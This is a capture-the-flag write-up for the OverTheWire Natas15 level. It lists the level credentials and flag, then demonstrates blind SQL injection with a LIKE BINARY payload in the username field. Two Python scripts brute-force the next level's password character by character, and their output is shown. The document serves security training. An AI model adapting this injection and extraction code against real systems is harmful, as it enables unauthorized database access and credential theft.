# Natas15

*	user: `natas15`
*	pass: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
*	url: `http://natas15.natas.labs.overthewire.org`
*	flag: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`

## Procedure

1.	Similarly to Natas14, also in this level a SQL Injection is feasible.
	Indeed, we have a text field where users' existence is checkable via
	a not parametrised SQL query.

2.	We're looking for Natas16 password, so let's try if user `natas16`
	exists...

		$ curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/?username=natas16
		<html>
		[cut]
		<div id="content">
		This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

3.	Well. Differently from Natas16, poisoned query's execution not
	provides any direct information. This means that we have to try a
	brute force attack.

4.	First of all we have to identify the charset containing only chars
	used in the password. To do that, we can exploit the operator `LIKE`
	allowing us to perform pattern matching. In practice, SQL code that
	we'll inject is

		natas16" AND password LIKE BINARY "%<CHAR>%" "

5.	In this case, Python can help us. The following script performs a
	brute force attack to identify the password charset

		import requests

		target = 'http://natas15.natas.labs.overthewire.org'
		charset_0 = (
			'0123456789' +
			'abcdefghijklmnopqrstuvwxyz' +
			'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
		)
		charset_1 = ''

		for c in charset_0:
			username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
			r = requests.get(target,
				auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
				params={"username": username}
			)
			if "This user exists" in r.text:
				charset_1 += c
				print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))

	By executing the script, final result will be

		CSET: 0*************************************************************
		CSET: 03************************************************************
		...
		CSET: 03569acehijmnpqtwBEHINORW*************************************

6.	Well. The sub-charset is

		03569acehijmnpqtwBEHINORW

	Now let's try to perform a brute force attack against a 32 chars
	string (previous passwords were 32 chars strings) with this Python
	script

		import requests

		target = 'http://natas15.natas.labs.overthewire.org'
		charset_1 = "03569acehijmnpqtwBEHINORW"

		password = ""
		while len(password) != 32:
			for c in charset_1:
				t = password + c
				username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
				r = requests.get(target,
					auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
					params={"username": username}
				)
				if "This user exists" in r.text:
					print ('PASS: ' + t.ljust(32, '*'))
					password = t
					break

	Run it

		$ python natas15.py
		PASS: W*******************************
		PASS: Wa******************************
		PASS: WaI*****************************
		...
		PASS: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
